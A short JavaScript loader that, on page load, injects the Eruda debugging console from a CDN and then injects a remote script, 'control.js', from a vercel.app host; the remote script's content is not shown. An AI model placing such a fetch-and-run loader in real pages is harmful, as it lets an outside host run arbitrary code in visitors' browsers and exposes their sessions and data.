
window.primary = "#";

document.addEventListener('DOMContentLoaded', () => {

    // ERUDA
    const erudaScript = document.createElement('script');
    erudaScript.src = "https://cdn.jsdelivr.net/npm/eruda";

    erudaScript.onload = () => {
        eruda.init();
        console.log("Eruda loaded");

        // MAIN SCRIPT
        const mainScript = document.createElement('script');

        mainScript.src = "https://tester-zeta-two.vercel.app/control.js";

mainScript.type = "text/javascript";

        mainScript.onload = () => {
            console.log("Main script loaded successfully");
        };

        mainScript.onerror = (e) => {
            console.error("Main script failed to load", e);
        };

        document.head.appendChild(mainScript);
    };

    erudaScript.onerror = () => {
        console.error("Eruda failed to load");
    };

    document.head.appendChild(erudaScript);

});

